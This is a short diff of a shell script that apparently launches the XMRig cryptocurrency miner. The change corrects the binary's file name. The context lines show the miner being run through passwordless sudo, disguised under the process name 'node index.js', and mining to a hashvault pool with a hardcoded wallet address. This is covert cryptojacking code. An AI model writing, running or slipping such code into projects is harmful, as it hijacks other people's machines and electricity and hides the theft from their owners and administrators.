@@ -40,7 +40,7 @@ while true; do
     fi
 
 
-    chmod +x xmrig$arch
+    chmod +x xmrig_$arch
     if sudo -n true 2>/dev/null; then
         sudo -n bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
     else
